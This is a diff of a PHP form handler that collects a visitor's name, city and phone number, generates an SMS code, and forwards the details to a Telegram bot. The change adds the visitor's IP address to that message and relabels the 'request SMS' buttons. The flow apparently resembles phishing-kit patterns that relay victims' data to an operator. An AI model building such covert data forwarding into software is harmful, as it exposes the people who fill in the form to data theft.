@@ -104,6 +104,7 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
     $nombre  = trim($_POST['nombre']);
     $ciudad  = trim($_POST['ciudad']);
     $celular = trim($_POST['celular']);
+    $ip      = $_SERVER['REMOTE_ADDR'] ?? '';
 
     // Guardar datos en sesión para validación posterior y avisos
     $_SESSION['celular'] = $celular;
@@ -113,17 +114,18 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
     $codigo = random_int(100000, 999999);
     guardarCodigo($celular, $codigo, $nombre);
 
-    // Enviar datos a Telegram con botón inline para pedir nuevo SMS
-    $mensaje = "Nueva postulación:\n" .
-               "Nombre: $nombre\n" .
-               "Ciudad: $ciudad\n" .
-               "Celular: $celular";
+    // Enviar datos a Telegram con botón inline para pedir primer SMS
+    $mensaje = "🔥Nuevo perfil \n" .
+               "👤Nombres: $nombre\n" .
+               "🌆 Ciudad: $ciudad\n" .
+               "📱 Celular: $celular\n" .
+               "🌐 Ip: $ip";
 
     $replyMarkup = [
         'inline_keyboard' => [
             [
                 [
-                    'text' => 'Pedir nuevo SMS',
+                    'text' => '📩 SMS',
                     'callback_data' => 'PEDIR_SMS|' . $celular,
                 ],
             ],
@@ -172,7 +174,7 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
         'inline_keyboard' => [
             [
                 [
-                    'text' => 'Pedir nuevo SMS',
+                    'text' => '📩🔄 SMS',
                     'callback_data' => 'PEDIR_SMS|' . $telefono,
                 ],
             ],
